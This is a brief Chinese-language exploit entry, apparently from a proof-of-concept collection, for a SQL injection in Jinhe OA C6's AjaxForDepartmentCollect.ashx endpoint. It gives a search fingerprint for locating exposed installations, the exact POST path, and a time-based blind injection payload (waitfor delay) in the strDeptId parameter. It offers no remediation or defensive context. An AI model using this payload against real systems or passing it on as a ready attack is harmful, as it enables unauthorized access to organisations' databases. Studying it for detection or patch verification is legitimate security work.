# 金和OAC6AjaxForDepartmentCollect存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1`

**Payload**
```
strType=getHistoryList&strDeptId=1;waitfor+delay+'0:0:5'--+&strCollectType=Department&strYear=2012
```
- **响应特征**：200